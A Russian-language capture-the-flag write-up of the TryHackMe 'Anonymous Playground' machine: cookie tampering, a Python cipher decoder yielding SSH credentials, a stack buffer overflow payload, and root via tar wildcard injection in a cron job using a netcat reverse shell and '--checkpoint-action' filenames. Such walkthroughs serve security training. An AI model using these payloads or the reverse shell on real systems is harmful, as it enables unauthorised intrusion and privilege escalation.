# Anonymous Playground

:white_check_mark:  [**Python "zA" decode**](#Python_zA_decode)

:white_check_mark:  [**Stack Buffer Overflow**](#Stack_Buffer_Overflow)

:white_check_mark:  [**Tar wildcards(privesc)**](#Tar_wildcards(privesc))

___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV anon.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 60:b6:ad:4c:3e:f9:d2:ec:8b:cd:3b:45:a5:ac:5f:83 (RSA)
|   256 6f:9a:be:df:fc:95:a2:31:8f:db:e5:a2:da:8a:0c:3c (ECDSA)
|_  256 e6:98:52:49:cf:f2:b8:65:d7:41:1c:83:2e:94:24:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Proving Grounds
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница **anon.thm**:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/1.png)

Nmap показывает нам директорию, которая содержится в robots.txt, перейдем по ней.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/2.png)

Приложение говорит, что у нас нет доступа. Посмотрим cookie сайта.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/3.png)

Возможно изменив значение cookie на "granted" мы получим доступ.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/4.png)

Мы получаем доступ и перед нами появляется какой-то код.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/5.png)

<a name="Python_zA_decode"></a>

В подсказке к машине говорится следующее: "You're going to want to write a Python script for this. 'zA' = 'a' ".  Данный текст был зашифрован следующим образом: берется порядковый номер каждой из двух подряд идущих букв. Их порядковые номера складываются. Затем забираем остатот от деления данного числа на 26(кол-во букв в алфавите). Тоесть:
```
'z' = 26
'A' = 1

'zA' = 26 + 1 = 27

27 % 26 = 1 = 'a'
```

Напишем скрипт, который будет расшифровывать данный текст.
```
def decoding(str_to_dec):
    letters_a_to_z = ""

    for i in range(ord('a'), ord('z') + 1):
        letters_a_to_z += chr(i)

    for i in range(0, len(str_to_dec), 2):
        first_letter = str_to_dec[i]
        second_letter = str_to_dec[i + 1].lower()

        first_letter_to_num = ord(first_letter) - ord('a') + 1
        second_letter_to_num = ord(second_letter) - ord('a') + 1

        letter_decoded = (first_letter_to_num + second_letter_to_num) % 26

        cipher_dec = letters_a_to_z[letter_decoded - 1]

        print(cipher_dec, end="")

decoding("hEzAdCfHzA")
print("")
decoding("hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN")
```

Получаем имя пользователя и пароль. Подключаемся по ssh.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/6.png)

Читаем записку. В ней пользователь spooky говорит, что написал программу и просит нас ее сломать.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/7.png)

<a name="Stack_Buffer_Overflow"></a>

Перебросив себе на машину эту программу("hacktheworld"), отправим ее в Ghidra. В коде программы можем заметить следующие интересные функции.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/8.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/9.png)

Если мы сможем перейти к setuid, то получим новые права доступа. Попробуем переполнить буффер этой программы. Будем использовать cyclic для создания полезной нагрузки. Перепробовав различные значения, программа начинает выдавать ошибку после 73 символов.

Cyclic 71 > alphabet:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/10.png)

Cyclic 72 > alphabet:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/11.png)

Cyclic 73 > alphabet:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/12.png)

Найдем адрес функции.
```
info functions
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/13.png)

Наш payload будет выглядеть следующим образом: 72 символа + адрес функции с прямым порядком байтов.

Перейдем к машине и с помощью python будет передавать в программу наш payload.

```
python -c 'print "A"*72+"\x57\x06\x40\x00\x00\x00\x00\x00"'  | ./hacktheworld
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/14.png)

Мы получаем то, что нужно, но оболочка прерывается. Это происходит потому, что оболочка выполняется, но не имеет никаких входных данных. Поэтому оболочка в конечном итоге просто завершает работу. Чтобы обойти это, будем использовать команду cat вместе с нашим payload-ом. Получаем оболочку.
```
(python -c 'print "A"*72+"\x58\x06\x40\x00\x00\x00\x00\x00"'; cat)  | ./hacktheworld
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/15.png)

<a name="Tar_wildcards(privesc)"></a>

Просмотрев crontab, можно обнаружить следующий фрагмент:
```
*/1 *   * * *	root	cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

Дело в том, что tar страает от загрязнения аргументов. Для экплуатации уязвимости можно использовать Wildcards. Отправим следующие команды для эксплуатации уязвимости:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <port> >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Запускаем слушать на нашей машине и через некоторое время получаем оболочку с root.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Anonymous_Playground/16.png)
